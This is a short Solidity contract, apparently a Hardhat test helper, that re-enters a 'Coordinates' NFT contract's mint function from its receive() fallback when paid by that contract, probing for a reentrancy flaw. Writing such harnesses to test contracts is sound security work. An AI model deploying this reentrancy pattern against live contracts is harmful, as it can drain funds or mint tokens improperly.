//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "./Coordinates.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

// import "hardhat/console.sol";

contract ReEntry is IERC721Receiver {
    address payable public coordinatesAddress;
    bool public reEntering = false;
    // address payable public owner;

    event MsgValue(uint256 msgValue);

    // fallback() external payable {
    //   mint();
    // }

    receive() external payable {
        uint256 price = Coordinates(coordinatesAddress).price();
        // console.log("trigger receive from", msg.sender);
        // console.log("sending   ", msg.value);
        // console.log("still have", address(this).balance);
        // console.log("price have", price);
        // console.log("price * 2 ", price * 2);
        if (msg.sender == coordinatesAddress) {
            if (address(this).balance >= (price * 2)) {
                Coordinates(coordinatesAddress).mint{value: price * 2}();
            }
        }
    }

    constructor(address payable coordinatesAddress_) {
        // owner = payable(msg.sender);
        coordinatesAddress = coordinatesAddress_;
    }

    // function reenter() internal {
    //   emit MsgValue(msg.value);
    //   if (!reEntering) {
    //     reEntering = true;
    //     Coordinates(coordinatesAddress).mint{value: msg.value}();
    //   }
    // }

    function mint() public payable {
        emit MsgValue(msg.value);
        Coordinates(coordinatesAddress).mint{value: msg.value}();
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        // reenter();
        return this.onERC721Received.selector;
    }
}
